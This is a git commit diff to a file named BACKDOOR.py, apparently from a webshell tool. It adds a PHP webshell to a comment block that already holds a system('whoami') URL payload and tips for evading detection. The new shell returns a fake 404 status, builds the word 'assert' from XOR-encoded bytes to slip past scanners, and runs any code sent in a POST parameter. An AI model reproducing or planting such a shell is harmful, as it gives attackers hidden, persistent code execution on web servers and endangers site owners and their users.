0a3bd74d752daa716a1e7d7f2390f58a523da4f6
Nan3r <nan3r@foxmail.com>
2020-03-31 17:20:04 +0800

    Update BACKDOOR.py

--- src/core/session/settings/BACKDOOR.py
+++ src/core/session/settings/BACKDOOR.py
@@ -67,6 +67,26 @@ https://xxxxx.com/1.php?c=assert&m=system('whoami');
 
 所有shell都可以使用use function a as b，或者添加0x00-0x20
 <script language="php"></script> php7后移除
+
+4.
+<?php 
+header('HTTP/1.1 404');
+class COMI { 
+    public $c='';
+    function __destruct() {
+        $_0 = "\xfc" ^ "\x9d";
+        $_1 = "\x4" ^ "\x77";
+        $_2 = "\xb4" ^ "\xc7";
+        $_3 = "\x9b" ^ "\xfe";
+        $_4 = "\x93" ^ "\xe1";
+        $_5 = "\xe7" ^ "\x93";
+        $db =$_0.$_1.$_2.$_3.$_4.$_5;
+        return @$db($this->c);
+    }
+}
+$comi = new COMI();
+@$comi->c = $_POST['yzddmr6'];
+?>
 */
 """
 
